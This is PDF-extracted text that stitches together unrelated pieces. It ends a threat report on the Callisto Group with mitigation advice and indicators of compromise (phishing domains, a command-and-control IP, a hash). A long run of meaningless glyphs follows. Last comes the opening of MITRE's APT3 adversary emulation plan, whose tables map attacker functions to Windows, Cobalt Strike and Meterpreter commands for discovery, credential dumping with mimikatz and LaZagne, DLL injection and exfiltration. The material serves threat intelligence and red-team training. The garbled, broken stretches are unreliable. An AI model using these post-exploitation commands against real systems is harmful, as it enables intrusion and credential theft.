journalist\n.\n More speci\u02dccally, many of the known \ntargets have a clear relation to foreign and security policy involving both Eastern Europe and the \n\nSouth Caucasus\n.\n \nThis targeting suggests the \nCallisto Group\n is interested in intelligence gathering related to foreign \nand security policy\n.\n Furthermore, we are unaware of any targeting in the described attacks that \nwould suggest a \u02dcnancial motive\n.\nIt is worth noting that during our investigation we uncovered links between infrastructure associated \n\nwith the \nCallisto Group\n and infrastructure used to host online stores selling controlled substances\n.\n \n\nWhile we don\u2122t yet know enough to fully understand the nature of these links, they do suggest the \n\nexistence of connections between the \nCallisto Group\n and criminal actors\n.\n \nWhile the targeting would suggest that the main benefactor of the \nCallisto Group\n\u2122s activity is a \nnation state with speci\u02dcc interest in the Eastern Europe and South Caucasus regions, the\u02ddlink to \n\ninfrastructure used for the sale of controlled substances hints at the involvement of a criminal \n\nelement\n.\n Finally, the infrastructure associated with the \nCallisto Group\n and related infrastructure \ncontain links to at least Russia, Ukraine, and China in both the content hosted on the infrastructure, \n\nand in WHOIS information associated with the infrastructure\n.\nIt is possible to come up with a number of plausible theories to explain the above \u02dcndings\n.\n For \n\nexample, a cyber crime group with ties to a nation state, such as acting on behalf of or for the bene\u02dct \n\nof a government agency, is one potential explanation\n.\n However, we do not believe it is possible to \n\nmake any de\u02dcnitive assertions regarding the nature or a\u02daliation of the \nCallisto Group\n based on the \n\ncurrently available information\n.\nCONTINUING ACTIVITY\nThe \nCallisto Group\n continues to be active\n.\n While they have been last known to employ malware in \nFebruary 2016, they continue setting up new phishing infrastructure every week\n.\nShould the \nCallisto Group\n be alerted to the fact that they have been noticed, we do not know \n\nhow they will react\n.\n They may stop everything or they may continue as if nothing has happened\n.\n \nHowever, as long as they believe they are succeeding in staying unnoticed, we believe it is highly \n\nlikely that they will continue their phishing activity, and follow up any successful compromises with \n\nadditional malware attacks\n.\n 6\nMITIGATION AGAINST SPEAR PHISHING AND \nRCS GALILEO\nThe spear phishing emails used in the known attacks \nby the \nCallisto Group\n were so convincing that even \n\nskilled and alert users would likely have attempted \n\nto open the malicious attachment\n.\n However, simply \nviewing the attachment would not have resulted \n\nin an infection as the document did not attempt to \n\nexploit any vulnerabilities\n.\nActual infection would have required the user \nto attempt to click a speci\u02dcc icon in the opened \n\nattachment\n.\n Furthermore, at least recent versions \nof Microsoft Word will prompt the user with an \n\nadditional warning stating that what the user is about \n\nto do is dangerous\n.\n For the infection to succeed, the \n\nuser would either have to acknowledge the prompt \n\nor be using an old enough version of Microsoft Word \n\nto not be warned\n.\nAdditionally, the malware payload used, RCS Galileo, \nis relatively well known\n.\n Therefore, most antivirus \n\nsolutions provide good protection against RCS \n\nGalileo and would have blocked the execution of \n\nthe malware payload\n.\n Using an up-to-date antivirus \n\nsolution with all protection features enabled is the \n\nmost e\u02dbective mitigation against highly targeted \n\nattacks such as these\n.\nREMEDIATION AGAINST CREDENTIAL \nPHISHING\nShould a user suspect having fallen victim to \ncredential phishing, immediate remediating \n\naction should be taken to reset the suspected \n\ncompromised credentials and enable two-factor \n\nauthentication\n.\n Any other services where the \n\nuser may have reused the same username and/or \n\npassword should also have the credentials reset\n.\nThese immediate actions should be followed by a \n\nthorough investigation to determine the extent \n\nof the possible compromise, to understand what \n\ndata may have been compromised, what actions \n\nthe attackers may have taken with the help of the \n\ncompromised credentials, and what the implications \n\nof these actions and compromise may be\n.\nIDENTIFICATION, MITIGATION, AND REMEDIATION\nMITIGATION AGAINST CREDENTIAL PHISHING\nUsing two-factor authentication for accessing \n\nemail would prevent the attackers from using \n\ncompromised credentials to gain access to a target\u2122s \n\nemail account\n.\n However, the compromise of login \ncredentials, especially should the victim not employ \n\nproper password hygiene (such as by reusing \n\npasswords), is a security risk in itself\n.\nREMEDIATION AGAINST RCS GALILEO\nShould a user suspect having become infected with \n\nRCS Galileo, their computer should immediately \n\nbe disconnected from the internet\n.\n However, care \nshould be taken to not power o\u02db the computer as \n\nthis would hinder the ensuing investigation into the \n\ncompromise\n.\nOnce the computer has been disconnected from the \n\ninternet, the malware will be unable to communicate \n\nwith its command and control server, thereby \n\ndisrupting the attacker\u2122s ability to control the \n\ncomputer\n.\n This should immediately be followed by \ninitiating a thorough forensic investigation into the \n\ncompromise\n.\n \nShould the a\u02dbected organization or individual not \n\nhave complete con\u02dcdence in their ability to properly \n\nperform such an investigation, they should employ \n\noutside assistance\n.\nIDENTIFYING CALLISTO GROUP ACTIVITY\nAppendix A provides indicators of compromise that can be used to attempt to identify \nCallisto \n\nGroup\n activity\n.\n Every e\u02dbort has been made to thoroughly document the tools, techniques, and \nprocedures of the \nCallisto Group\n, as well as possible methods of identifying whether an individual \n\nor organization has been targeted or compromised by this threat actor\n.\n However, it is possible \nthat the \nCallisto Group\n is also using other tools, techniques, and/or procedures that would evade \n\nidenti\u02dccation by the provided methods\n.\nIt is highly encouraged that any, even slight, suspicion of compromise be thoroughly investigated\n.\n A\nPPENDI\nX A \u02dc \nINDICATORS OF COMPROMISE\nPHISHING INFRASTRUCTURE\nDomains known or believed to be used in relation to \nphishing\n.\n These may be used as targets of links or as \n\ndomains for sender email addresses\n.\naccounts-google\n.\neu\naccounts-mail\n.\nasia\nauthenti\u02dccation-request\n.\ntop\nauth-login\n.\ntop\ndrive-login\n.\ncom\ndrive-meet-goodle\n.\nru\nemailapp\n.\npw\nfco-gov\n.\npw\nfco-net\n.\npw\ngoogle-accounts\n.\neu\ngoogle-plus\n.\ntop\ngoogle-service\n.\neu\ngo-very\u02dccation\n.\nlink\nhotmail-online\n.\neu\nicloud-service\n.\npw\nlive-com\n.\npw\nlive-login\n.\ninfo\nlogin-access\n.\ntop\nlogin-live\n.\nreview\nlogin-livecom\n.\nin \nlogin-livecom\n.\ninfo\nlogin-live-com\n.\npw \nmisrcosofts\n.\ncom\nnode005-prevention-aol\n.\nlink\nnode03-prevention-icloud\n.\nlink\nplatforma\n.\nlink\n\nprevention-aol\n.\nlink\nprevention-aol\n.\ntop\nprevention-icloud\n.\nlink\nqooqle-support-mail\n.\npw\n\nscreenname\n.\nclick\nscreenname-aol\n.\npw\n\nsecure-lcloud\n.\naccountant\nsecure-store-lcloud\n.\ntop\nservice-mail\n.\nasia\nservice-mail\n.\nin\n\nserv-login-com\n.\npw\n\nshared-docs\n.\npw \nstore-icloud\n.\nlink\nsupport-gmail\n.\npw\n\nsupport-mail\n.\npw \n\nsupport-mail\n.\ntop\nupdatemail\n.\nin\n\nyahoocentermail\n.\ninfo\n\nyahoocentermail\n.\npw \nyahoomailfree\n.\npw\nCOMMAND & CONTROL INFRASTRUCTURE\nKnown command & control servers\n89\n.\n46\n.\n102\n.\n43\nSAMPLE HASHES\nSHA1 of related RCS Galileo sample\n.\n We believe other \nsimilar samples exist\n.\n07cdc67d211d175cd9d418dc5482b3f17d93526a\nDETECTION NAMES\nF-Secure detects \nCallisto Group\n activity with a variety of \ngeneric, behavioral, and other detections including the \n\nfollowing:\nGen:Variant\n.\nSymmi\n.\n54992\nFILE PATHS\nUpon infection, known samples of \nCallisto Group\n\u2122s RCS \n\nGalileo have stored copies of themselves in the following \n\nlocations: \n%TEMP%\\Microsoft Word\n.\nexe\n%TEMP%\\WinWord\n.\nexe\n>startup folder<\\bleachbit\n.\nexe\n>startup folder<\\BluetoothView\n.\nexe\n  ", "#\n\u00aa\n\u00c0\n\ufb01\n\u201d\n\u201a\n\u00c6\n\u00c0\n;\n\ufb01\n\u00aa\n\u00c6\n\u00af\n;\n#\n\u00bc\np\n\u00aa\n\ufb01\np\n\u00aa\n;\n\u00bc\n;\n\u00b9\ufb01\n\u00af\n\u00aa\np\n\u201d\n\u2014\n\u02d8\n;\nG\nS\n\u00ee\n\u00ee\n;\nS\np\n\u00bc\n\u201d\n\u2014\n\u00c6\n\u00c0\n\u2014\u00bc\n\u00af\n\u00c0\n\u00b9p|\n\u2014\n;\np\n\u00aa\n\u2022\n;\n\u2014\n\u00bc\n\u201d\n\u00da\n;\nN\n\u2014\n|\n\u00c6\n\u00af\n\u00bc\n\u00c0\n;\np\n\u00aa\n\u2022\n;\n\u201a\np\n\u00c0\n;\nS\n\ufb01\n\u2014\n\u00c0\n;\n\u00c6\n\u00af\n;\n\u2014\n\u00c0\n\u00c6\n\u00bc\n\u00ca\n|\n\u00c6\n\ufb01\n\u00d3\n\u2014\n7\np\n\u00a3\n\u00d4\np\n\u00bc\n\u2014\nS\np\n\u00bc\n\u201d\n\u2014\n\u00c6\n\ufb01\n\u00aa\n\u201d\n N\n\u00b9\n\u2014\np\n\u00bc\n;\nG\n\u201a\n\ufb01\n\u00c0\n\u201a\n\ufb01\n\u00aa\n\u201d\n \u00af\u00a9\np\n\ufb01\n\u00aa\n;\n7\np\n\u00c0\n\u00bb\n\u00ca\n\u2014\n\u00bc\np\n\u2022\n\ufb01\n\u00aa\n\u201d\n #\n\u2022\n\u2014\n\u00aa\n\u00c6\n\ufb01\n\u00e3\n\u2014\n\u2022\n;\nG\n\u2014\n\u00bc\n\u00c0\n\u00af\u00aa\np\n;\n1\n\ufb01\n\u00aa\n\u20ac\n\u2014\n\u2022\n;\n\u00c6\n\u00af\n;\n#\n\u00bc\np\n\u00aa\n\ufb01\np\n\u00aa\n;\n\u02dc\n\u00af\n\u00d3\n\u2014\n\u00bc\n\u00aa\n\u00a9\n\u2014\n\u00aa\n\u00c6\nG\n\u00af\u00c6\n\u2014\n\u00aa\n\u00c6\n\ufb01\np\n\u00a3\n;\nS\n\ufb01\n\u2014\n\u00c0\n;\n\u00c6\n\u00af\n;\n\u2014\n\u00c0\n\u00c6\n\u00bc\n\u00ca\n|\n\u00c6\n\ufb01\n\u00d3\n\u2014\n;\np\n\u00b9\np\n{\n\ufb01\n\u00a3\n\ufb01\n\u00c6\n\ufb01\n\u2014\n\u00c0\n;\np\n\u00aa\n\u2022\n;\n\u00af\u00a9\n\u00b9\np\n\u00bc\n\ufb01\n\u00c0\n\u00af\u00aa\u00c0\n;\n\u00d4\n\ufb01\n\u00c6\n\u201a\n;\nN\n\"\n7\n=\n=\n8\n \u2022\n\u2022\n\ufb01\n\u00c6\n\ufb01\n\u00af\u00aa\np\n\u00a3\n;\nS\n\ufb01\n\u2014\n\u00c0\n;\n\u00af\u00a3\n\u00c0\n\u00c6\n\u2014\n\u00bc\n;\n\u00c6\n\u00c6\n\u00bc\n\ufb01\n{\n\u00ca\n\u00c6\n\ufb01\n\u00af\u00aa\n;\n\u00c6\n\u00af\n;\n#\n\u00bc\np\n\u00aa\n=\n\u00ca\n\u00c6\n\u00a3\n\u00af\u00af\u20ac\n;\np\n\u00aa\n\u2022\n;\n#\n\u00a9\n\u00b9\n\u00a3\n\ufb01\n|\np\n\u00c6\n\ufb01\n\u00af\u00aa\n\u00c0\n \u00b9\n\u00b9\n\u2014\n\u00aa\n\u2022\n\ufb01\n\u00d9\n7p\n\u00a3\n\u00d4\np\n\u00bc\n\u2014\n;\n\u02dap\n\u00a9\n\ufb01\n\u00a3\n\u00da\n;\n\u00c0\n|\n\u00bc\n\ufb01\n\u00b9\n\u00c6\n\ufb01\n\u00af\u00aa\n\u00c0\n#\n\u00aa\n\u2022\n\ufb01\n|\np\n\u00c6\n\u00af\u00bc\n\u00c0\n;\n\u00af\n\u201c\n;\n\u00af\u00a9\n\u00b9\n\u00bc\n\u00af\u00a9\n\ufb01\n\u00c0\n\u2014\n    N\ufb01\u201d\n\u00aa\n;\n\u00ca\n\u00b9\n;\n\u201c\n\u00af\n\u00bc\n;\n\u2014\u00a9\np\n\ufb01\n\u00a3\n;\n\u00ca\n\u00b9\n\u2022\np\n\u00c6\n\u2014\u00c0\n ", "APT3 Adversary Emulation Plan\n \n \n \nAuthors\n: Christopher A. Korban\n \n \nDouglas P. Miller\n \nAdam Pennington\n \n \nCody B. Thomas\n \n \n \n \nSeptember 2017\n \nMTR170446\n \nMITRE \nTECHNICAL \nREPORT\n \n \n \n \n \n \n \nDept. No.: \nJ83L\n \nProject No.:\n \n0717MM09\n-\nAA\n \n \n \nThe views, opinions and/or\n \nfindings \ncontained in this report are \nthose of The \nMITRE Corporation and should not be \nconstrued as an official government position, \npolicy, or decision, unless designated by \nother documentation.\n \n \nApproved for Public Release; \n \nDistribution Unlimited. Case Number 17\n-\n3569. \u00a92018 The MITRE Corporation. All \nRights Reserved\n \n \nAnnapolis Junction, MD\n \n \n  iii\n \nAbstract\n \nTo advance the practice of security testing through adversary emula\ntion\n, we present this \nemulation plan to be used by a team looking to emulate the \nAPT3 \nthreat group\n. It\n \nincludes th\neir\n \ncommonly known behavior through the tactics, te\nchniques, and procedures \nthat have been \ndocumented in publicly\n \navailable reporting. \nTo ground \nthe plan in a common taxonomy, it is \nbased on the MITRE ATT&CK model. The scope\n \ncovers\n \nthe adve\nrsary lifecycle, from \ninitial \nnetwork compromise \nthrough\n \nexfiltration. It discusses tools, methods, style, tradecraft, and \nend\n-\ngoal\ns. \nTo fill\n \nintel gaps, \nbest\n-\nes\ntimates based on\n \nexperience in threat intelligence and adversary \nemulation\n \nare provided.\n \n \n iv\n \nAcknowledgments\n \nWe would like to acknowledge the people that contributed to the content, review, and format of \nthis document. This includes: Frank Duff, Katie Nickels\n, and Blake Strom.\n \n \n v\n \nTable of Contents\n \n \nOverview\n \n1\n-\n1\n \n \nAPT3 Overview\n \n................................\n................................\n................................\n....................\n \n2\n-\n1\n \n2.1\n \nAPT3 Tools\n \n................................\n................................\n................................\n...................\n \n2\n-\n2\n \n2.2\n \nAPT3 Too\nl Functionality\n \n................................\n................................\n..............................\n \n2\n-\n4\n \n2.2.1\n \nPirpi Functions\n \n................................\n................................\n................................\n........\n \n2\n-\n4\n \n2.2.2\n \nPlugX Functions\n................................\n................................\n................................\n......\n \n2\n-\n6\n \n2.2.3\n \nOSInfo Functions\n \n................................\n................................\n................................\n....\n \n2\n-\n7\n \n2.2.\n4\n \nPwdump Functions\n................................\n................................\n................................\n..\n \n2\n-\n9\n \n2.2.5\n \nMimikatz Functions\n \n................................\n................................\n................................\n \n2\n-\n9\n \n2.2.6\n \nRemoteCMD Functions\n \n................................\n................................\n..........................\n \n2\n-\n9\n \n2.2.7\n \nDsquery Functions\n \n................................\n................................\n................................\n..\n \n2\n-\n9\n \n2.2.8\n \nLaZagne Functions\n................................\n................................\n................................\n \n2\n-\n10\n \n2.2.9\n \nScanBox Functions\n \n................................\n................................\n...............................\n \n2\n-\n10\n \n \nEmulation Phases\n \n................................\n................................\n................................\n...............\n \n3\n-\n10\n \n3.1\n \nPhase 1 \n\n \nInitial Compromise\n \n................................\n................................\n.....................\n \n3\n-\n11\n \n3.1.1\n \nImplant Command and Control\n \n................................\n................................\n............\n \n3\n-\n11\n \n3.1.2\n \nDefense Evasion\n................................\n................................\n................................\n....\n \n3\n-\n11\n \n3.1.3\n \nInitial Access\n \n................................\n................................\n................................\n.........\n \n3\n-\n11\n \n3.1.3.1\n \nCase 1 \n\n \nSpear Phishing with Browser Exploit [2]\n \n................................\n......\n \n3\n-\n11\n \n3.1.3.2\n \nSpear Phishing with Malicious RAR Attachment [3]\n \n................................\n..\n \n3\n-\n12\n \n3.1.3.3\n \nSpear Phishing with Malicious RAR Attachment [21]\n \n................................\n \n3\n-\n12\n \n3.1.3.4\n \nSpear Phishing with Maliciou\ns RAR Attachment [21]\n \n................................\n \n3\n-\n13\n \n3.1.3.5\n \nFlash Exploit with Malware Concealed Within GIF [12]\n \n............................\n \n3\n-\n13\n \n3.1.3.6\n \nVictim Profiling [14]\n \n................................\n................................\n....................\n \n3\n-\n13\n \n3.2\n \nPhase 2 \n-\n \nNetwork Propagation\n................................\n................................\n...................\n \n3\n-\n13\n \n3.2.1\n \nMachine Operations\n \n................................\n................................\n..............................\n \n3\n-\n14\n \n3.2.1.1\n \nDiscovery\n \n................................\n................................\n................................\n......\n \n3\n-\n14\n \n3.2.1.2\n \nLocal Privilege Escalation\n \n................................\n................................\n............\n \n3\n-\n15\n \n3.2.1.3\n \nPersistence\n \n................................\n................................\n................................\n....\n \n3\n-\n16\n \n3.2.1.4\n \nCredential Access\n \n................................\n................................\n.........................\n \n3\n-\n16\n \n3.2.2\n \nLateral Movement\n \n................................\n................................\n................................\n.\n \n3\n-\n17\n \nRemote Copy and Execution\n \n................................\n................................\n.........................\n \n3\n-\n17\n \n3.3\n \nPhase 3 \n-\n \nExfiltration\n \n................................\n................................\n................................\n..\n \n3\n-\n17\n \n \nBibliography\n \n................................\n................................\n................................\n............................\n \n1\n \n \n \n vi\n \nList of Figures\n \nFigure 1 APT3's Three Phases of Action\n \n................................\n................................\n.....................\n \n2\n-\n2\n \nFigure 2 APT3 Phase 2 Flow Chart\n \n................................\n................................\n...........................\n \n3\n-\n14\n \nFigure 3 APT3 Discovery ATT&CK Techniques\n \n................................\n................................\n.....\n \n3\n-\n15\n \nFigure 4 APT3 Privilege Escalation ATT&C\nK Techniques\n \n................................\n......................\n \n3\n-\n15\n \nFigure 5 APT3 Pe\nrsistence ATT&CK Techniques\n \n................................\n................................\n....\n \n3\n-\n16\n \nFigure 6 APT3 Credential Access ATT&CK Techniques\n \n................................\n.........................\n \n3\n-\n16\n \nFigure 7 APT3 Lateral Movement and Execution ATT&CK Techniques\n \n................................\n \n3\n-\n17\n \nFigure 8 APT3 Exfiltration ATT&CK Techniques\n \n................................\n................................\n...\n \n3\n-\n17\n \n \n \n \n vii\n \nList of Tables\n \nTable 1 APT3 Tool Usage\n \n................................\n................................\n................................\n...........\n \n2\n-\n3\n \nTable 2 Pirpi Functions and Emulation\n \n................................\n................................\n.......................\n \n2\n-\n4\n \nTable 3 PlugX Functions and Emulation\n \n................................\n................................\n.....................\n \n2\n-\n6\n \nTable 4 OSInfo Functionality and Emulation\n \n................................\n................................\n..............\n \n2\n-\n7\n \nTable 5 Pwdump Functions and Emulation\n \n................................\n................................\n.................\n \n2\n-\n9\n \nTable 6 Mimikatz Functions and Emulation\n \n................................\n................................\n................\n \n2\n-\n9\n \nTable 7 RemoteCMD Functions and Emulation\n \n................................\n................................\n..........\n \n2\n-\n9\n \nTable 8 Dsquery Function and Emulation\n \n................................\n................................\n...................\n \n2\n-\n9\n \nTable 9 LaZagne Functions and Emulation\n \n................................\n................................\n...............\n \n2\n-\n10\n \nTable 10 ScanBox Functions and Emulation\n \n................................\n................................\n.............\n \n2\n-\n10\n \n \n \n \n \n  \n \n2\n-\n1\n \n \nOverview\n \n \nIn an effort to\n \nadvance the practice of security testing through adversary emulation and \nadversarial engineering, we present this emulation plan to be used by an adversary emulation \nteam looking to emulate the threat group commonly known as APT3. The plan includes the \ngr\n\nhave been documented in \npublicly\n \navailable threat reporting. To ground the plan in a common \ntaxonomy, it is based on the MITRE ATT&CK model\n1\n. The scope of this emulat\nion plan covers \nthe adversary lifecycle, beginning with initial network compromise and ending with exfiltration. \nIt discusses tools, methods, style, tradecraft, and end state \nobjectives. \nHistorically, i\nnformation \nabout attackers\n\n \non\n-\ntarget actions\n \nand goal\ns\n \nhave been\n \ndifficult to \nobtain\n \nand APT3 reporting is \nno exception\n; however, the document bases instructions off publicly accessible sources whenever \npossible, focusing on sources that could be cross\n-\nreferenced to some degree. To fill the intel \ngaps, the a\nuthors relied on their experience in threat intelligence and adversary\n \nemulation for \nbest\n-\nestimates. \n \nThreat reporting sources vary widely, and correlation of activity to a threat group is not \nstraightforward, and as such the authors have worked to ensure \nreputable sources are referenced. \nWhile many threat intelligence sources work to provide information that is as accurate as \npossible to the community, there is still an inherent risk that third\n-\nparty threat reporting may \nprovide inaccurate information.\n \n \nNote: Within this document, italicized text represents notes. \nThese notes represent comments that \n\nconcessions that have been made to make the \nemulation instructions\n \npractical or\n \nto\n \nindicate \nwhere inconsistent or nonexistent reporting has required gaps to be filled in with best\n-\nguess\n \ne\nstimates of adversary behavior.\n \nReferences are indicated in\n-\nline with bracketed numbers [#] and listed at the end of this \ndocument.\n \n \nAPT\n3 Overview\n \nATT&CK \nGroup \nID\n: \nGroup/G0022\n \nAliases\n: APT3, Gothic Panda, Pirpi, UPS Team, Buckeye, Threat Group\n-\n0110, TG\n-\n0110\n \nOperations\n: Clandestine Wolf, Clandestine Fox \n[1]\n, Operation Double Tap \n[2]\n \nTarget Industries\n: Aerospace and Defense, Construction and Engineering, High Tech, \nTelecommunications, Transportation \n[1]\n \n \nAdversary Objecti\nves\n: Reporting indicates APT3 actors are interested \nin exfiltration of \ndocuments \n[3]\n. They have been known to target printers and file shares\n \n[3]\n. They also target \nintellectual property, \noften industrial in nature. \n[4]\n.\n \n                                        \n        \n \n \n1\n \nhttps://attack.mitre.org\n \n  \n \n2\n-\n2\n \nBackground\n: APT3 is a China\n-\nbased threat group. APT3 has traditionally targeted a myriad of \nUS and international targets; however, reporting da\nted September 2016 indicates the group \nshifted focus around March 2016 to target Hong Kong organizations \n[3]\n.\n \n\n \n1.\n \nInitial Setup of command and control (\nC2), defense evasion techniques, and getting initial \ncompromise\n \n2.\n \nDiscovery, privilege escalation, lateral movement, persistence, and execution\n \n3.\n \nCollection, data staging, and exfiltration\n \n \n \nFigure \n1\n \nAPT3's Three Phases of Action\n \nThes\ne phases are broken up into more detail in the following sections. The next section is about \nthe tools that APT3 uses for their operations, how to emulate them, and what ATT&CK tactics \nand techniques they correspond to. Command\n-\nline examples, as well as de\nscriptions of what the \n\nAPT3 Adversary Emulation Field Manual\n\nreference.\n \n2.1\n \nAPT3 Tools\n \nAPT3 uses a combination of custom and openly available tools. Because custom adversary tools \ncan have hidden functionality, be difficult to tailor to new environments, or \nutilize \nserver\n-\nside \ncontrollers\n \nwhich\n \nmay be unavailable, recommendations are made fo\nr replacements that can \naccurately perform similar activity. Adversary emulators and defenders should be aware that \nreplacement tools will typically leave different footprints than adversary tools, specifically \ndifferent file hashes, command line arguments\n, Antivirus detection, API calls, and network \nsignatures. There are lots of ways to accomplish the same objectives with built\n-\nin Windows \ntools, but the focus for APT3 tends to be on more simplistic tools rather than more advanced \nWindows utilities like WMI\nC, WinRM, and PowerShell. The following table describes how to \nemulate the tools as well as detailing which ATT&CK Tactics are represented by them.\n \n  \n \n2\n-\n3\n \n \nTable \n1\n \nAPT3 Tool Usage\n \nName\n \nSoftware \nType\n \nAvailability\n \nEmulation Notes\n \nATT&CK \nTactic\n \nPirpi, \nSHOTPUT, \nBackdoor.APT.C\nookieCutter\n \nRAT\n \nCustom\n \nS\ntandard Windows \nBinary based post\n-\nc\nompromise toolkits \nsuch as MetaS\nploit\n \n(free)\n \n[5]\n \nor Cobalt \nStrike\n \n(paid)\n \n[6]\n \nDefense Evasion, \nCredential \nAccess, \nDiscovery, \n \nPlugX\n \n[7]\n \n[8]\n \nRAT\n \nCustom, but seen \nacross multiple \ngroups\n \nOSInfo \n[3]\n \nInformation \nDiscovery\n \nCustom\n \nSeveral Windows \ncommands can be \nused to gather \nsimilar information \n(net use, \nsysteminfo, set), \nalso PowerShell \nscripts \n[9]\n \nDiscovery\n \nCustomized \npwdump \n[3]\n \nWindows \nPassword \nDumper\n \nUnm\nodified\n \nversion openly \navailable \n \nStandard version of \npwdump or \nmimikatz\n \n \nCredential Access\n \nCustomized \nMimikatz\n \nWindows \nPassword \nDumper\n \nUnmodified \nversion openly \navailable\n \nS\ntandard version of \nmimikatz \n[10]\n \nCredential Access\n \nKeylogger \n[3]\n \nKeylogger\n \nCustom\n \nNumerous publicly \navailable \nkeyloggers \n \nCollection, \nCredential Access\n \nRemoteCMD \n[3]\n \nRemote \nExecution\n \nCustom\n \nOperates similarly \nto PsExec \n[11]\n \n \nExecution, \nLateral Movement\n \nDsquery\n \nInformation \nDiscovery\n \nOpenly Available, \ndefault on \nWindows Server\n \nA copy of Dsquery \ncan be brought onto \na system if it \n\ndefault.\n \nDiscovery\n \nChromePass \n[3]\n \nBrowser \nPassword\n \nDumper\n \nOpenly Available\n \nChromePass \n[12]\n \nis \na publicly available \nprogram from \nNirSoft\n \nCredential \nAccess, \nCollection\n \n  \n \n2\n-\n4\n \nLazagne \n[3]\n \nApplication \nPassword \nDumper\n \nOpenly Available\n \nLazagne \n[13]\n \nsource code is \nfreely available on \nGithub\n \nCredential Access\n \nScanBox \n[3]\n \nExploitKit/\nHost \nPr\nofiler, and \nJavaScript \nKeylogger \n \nCustom\n \nUsed just before \ninitial exploit, \neffectively out of \nscope since pre \n-\ninitial network \ncompromise.\n \nN/A (Case could \nbe made for \n\nKeylogger part \nhowever)\n \n \n2.2\n \nAPT3 Tool Functionality\n \n\nprovide a breadth of functionality. This section aims to break down these \ncustom tools\n \nfrom the table above\n \na bit further into their specific functions and show how they \nrelate to ATT&CK, Windows utilities, and toolkits that are open sour\nce and commercially \navailable. \n \n2.2.1\n \nPirpi Functions\n \nTable \n2\n \nPirpi Functions and Emulation\n \nPirpi Function\n \nWindows \nBuilt\n-\nin\n \nCobalt \nStrike/Beacon\n \nMetasploit/Meterpreter\n \nATT&CK \nTechnique\n \nList processes\n \ntasklist\n \nps, shell \nqprocess *\n \nps\n \nT1057 \n-\n \nProcess \nDiscovery\n \nDownload file\n \nftp\n \ndownload \n[filename]\n \nDownload [filename]\n \nT1041 \n-\n \nExfiltration over \nCommand and \nControl Cha\nnnel\n \nExecute file\n \ncmd.exe /c \nfile.exe\n \nshell \n[filename]\n \nshell cmd.exe \n/c [filename]\n \nExecute \n\nf [filename] [\n\ni] [\n-\nH]\n \nT1059 \n-\n \nCommand\n-\nLine \nInterface\n \nLoad/execute \nDLL (from \ndisk)\n \nRundll32.exe \n[filename.dll], \nentry\n \nshell rundll32 \n[filename.dll], \nentry\n \npost/windows/manage/ \nreflective_dll_inject\n \nT1085 \n-\n \nRundll32\n \nLoad/execute \nDLL (from \nmemory)\n \n \n \npost/windows/manage/ \nreflective_dll_inject\n \n \n  \n \n2\n-\n5\n \nList servers in \ndomain\n \nnet group \n\n\n/domain\n \nshell net group \n\n\n/domain\n \npost/windows/gather/ \nenum_ad_computers\n \nT1018 \n-\n \nRemote \nSystem \nDiscov\nery\n \nList TCP \nconnections\n \nNetstat \n-\nano\n \nshell netstat \n-\nano\n \npost/windows/gather/ \ntcpnetstat\n \nT1049 \n-\n \nSystem \nNetwork \nConnections \nDiscovery\n \nList connected \nusers\n \nNet session\n \nshell net \nsession\n \npost/windows/gather/ \nenum_logged_on_users\n \nT1049 \n-\n \nSystem \nNetwork \nConnections \nDiscovery\n \nList domain \ncontrollers\n \nNet group \n\n\n/domain,\n \nNltest /dclist\n \nshell net group \n\n\n/domain,\n \nshell nltest \n/dclist,\n \nnet dclist\n \n \nT1049 \n-\n \nRemote \nSystem \nDiscovery\n \nList \ndirectories\n \nDir, tree\n \nshell dir\n \nls\n \nT1083 \n-\n \nFile and \nDirectory \nDiscovery\n \nTerminate \nProcess\n \nTaskkill\n \nshell taskkill \n/pid [pid]\n \nkill [pid]\n \n \nDelete file\n \nDel [filename]\n \nshell del \n[filename]\n \nexecute \n\n\n\n \nT1107 \n-\n \nFile \nDeletion\n \nSleep\n \n \nsleep [time in \nseconds]\n \n \n \nGet Network \nAdapter Info\n \nIpconfig /all, \nnetsh config\n \nshell ipconfig \n/all\n \nexecute \n\nf cmd.exe \n\n \nT1016 \n-\n \nSystem \nNetwork \nConfiguration \nDiscovery\n \nUpload file\n \nftp\n \nupload \n[filename]\n \nupload [filename] \n[destination]\n \nT1105 \n-\n \nRemote \nFile Copy\n \n \n \n \n \n  \n \n2\n-\n6\n \n2.2.2\n \nPlugX Functions\n \n \nTable \n3\n \nPlugX Functions and Emulation\n \nNote: The PlugX table differs from the other tables in that each row refers to a module, not \nfunction, of PlugX. Modules within PlugX leverage other PlugX modules to perform functions, \nfor example, the Disk module allows othe\nr modules to use any of the functions it provides on the \ndisk, such as execute, create new files, copy, delete, etc..\n \n \n \nPlugX  \nModules\n \n[8]\n \nWindows \nBuilt\n-\nin\n \nCobalt \nStrike/Beacon\n \nMetasploit/\n \nMeterpreter\n \nATT&CK \nTechnique\n \nDisk\n \n.\n\\\n[file], type \n[file], del, copy\n \nshell \n[file/type/del/c\nopy], upload\n \nexecute \n-\n\n\nupload\n \nT1059 \n\n \nCommand\n-\nLine \nInterface, \nT1083 \n\n \nFile \nand Directory \nDiscovery\n \nProcess\n \nTasklist, \ntaskkill\n \np\ns, shell \ntaskkill /pid \n[pid]\n \n \np\ns, Kill [pid]\n \nT1057 \n\n \nProcess \nDiscovery\n \nService\n \nsc \n[query/start/sto\np/\n \nconfig/create/\n \ndelete]\n \ns\nhell sc \n[query/start/sto\np/\n \nconfig/create/\n \ndelete]\n \nexecute \n\n\n[query/start/stop/config/c\n\n \nT1050 \n\n \nNew \nService, T1031 \n\n \nModify \nExisting \nService, T1035 \n\n \nService \nExecution\n \nRegedit\n \nregedit\n \nshell regedit\n \nreg\n \nT102 \n\n \nQuery \nRegistry, T1112 \n\n \nModify \nRegistry\n \nNetstat\n \nnetstat\n \nshell netstat\n \np\nost/windows/gather/tcpn\netstat\n \nT1049 \n\n \nSystem \nNetwork \nConnections \nDiscovery\n \nNethood\n \nnet view \n[/domain]\n \nshell net view \n[/domain]\n \nexecute \n-\n\n\n \nT1018 \n\n \nRemote System \nDiscovery\n \nOption\n \nshutdown \n[/l,/r,/t]\n \nshell shutdown \n[/l,/r/t]\n \nexecute \n-\nf  cmd.exe \n\n \nN/A\n \n  \n \n2\n-\n7\n \nPortMap\n \nDetails still \nN/A.\n \nDetails still \nN/A.\n \nDetails still\n \nN/A.\n \nDetails still \nN/A.\n \nScreen\n \nPrintScreen \nkey if GUI \navailable\n \nscreenshot PID \n[x64]\n \nmigrate PID | use espia | \nscreengrab\n \nT1113 \n\n \nScreen \nCapture\n \nShell\n \ncmd.exe /c \n[command]\n \nshell \n[command]\n \n\n-\nf \ncmd.exe \n-\nc \n-\n\n \nT1059 \n\n \nCommand\n-\nLine 